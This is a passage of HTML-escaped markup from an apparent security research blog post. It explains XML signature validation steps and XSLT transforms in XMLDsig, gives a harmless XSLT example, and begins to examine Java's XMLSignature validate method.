baseline; white-space: pre-wrap;\"&gt; chain and calculate its hash digest. Compare the calculated Digest with the stored &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;DigestValue&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; and fail if they differ.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Signature Validation: First canonicalize the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element using the specified &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CanonicalizationMethod&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; algorithm. Calculate the signature of &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; using the algorithm specified in &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignatureMethod&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; and the signer key described in &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KeyInfo&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. Compare the result with &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignatureValue &lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;and fail if they differ.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Interestingly, the order of these two steps can be implementation specific. While the XMLDsig RFC lists Reference Validation as the first step, performing Signature Validation first can have security advantages as we will see later on.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Correctly validating XML signatures and making sure the data we care about is protected, is very difficult in the context of SAML. This will be a topic for later blog posts, but at this point we want to focus on the reference validation step:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As part of this step, the application verifying a signature has to run attacker controlled transforms on attacker controlled input. Looking at the list of transformations supported by XMLDsig, one seems particularly interesting: XSLT.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XSLT, which stands for Extensible Stylesheet Language Transformations, is a feature-rich XML based programming language designed for transforming XML documents. Embedding a XSLT transform in a XML signature means that the verifier has to run the XSLT program on the referenced XML data.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The code snippet below gives you an example of a simple XSLT transformation. When executed it fetches each &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;data&amp;gt;&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element stored inside &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;input&amp;gt;&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, grabs the first character of its content and returns it as part of its &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;output&amp;gt;&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. So &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;input&amp;gt;&amp;lt;data&amp;gt;abc&amp;lt;/data&amp;gt;&amp;lt;data&amp;gt;def&amp;lt;/data&amp;gt;&amp;lt;/input&amp;gt;&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; would be transformed into &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;output&amp;gt;&amp;lt;data&amp;gt;a&amp;lt;/data&amp;gt;&amp;lt;data&amp;gt;d&amp;lt;/data&amp;gt;&amp;lt;/output&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;Transform&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; Algorithm&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"http://www.w3.org/TR/1999/REC-xslt-19991116\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;xsl:stylesheet&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; xmlns:xsl&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"&lt;/span&gt;&lt;a href=\"http://www.w3.org/1999/XSL/Transform\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: black; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;http://www.w3.org/1999/XSL/Transform&lt;/span&gt;&lt;/a&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;xmlns&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"http://www.w3.org/TR/xhtml1/strict\" exclude-result-prefixes&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"foo\"&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;version&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"1.0\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;xsl:output&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; encoding&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"UTF-8\" indent&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"no\" method&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"xml\" &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;xsl:template&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; match&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"/input\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;output&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;xsl:for-each&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; select&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"data\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;data&amp;gt;&amp;lt;xsl:value-of&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; select&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"substring(.,1,1)\" &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&amp;lt;/data&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/xsl:for-each&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/output&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/xsl:template&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/xsl:stylesheet&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;/Transform&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Exposing a fully-featured language runtime to an external attacker seems like a bad idea, so let's take a look at how this feature is implemented in Java’s OpenJDK.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;XSLT in Java&lt;/span&gt;&lt;/h2&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Java’s main interface for working with XML signatures is the &lt;/span&gt;&lt;a href=\"https://docs.oracle.com/en/java/javase/18/docs/api/java.xml.crypto/javax/xml/crypto/dsig/XMLSignature.html\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;java.xml.crypto.XMLSignature &lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;class and its sign and validate methods. We are mostly interested in the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validate&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; method which is shown below:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; 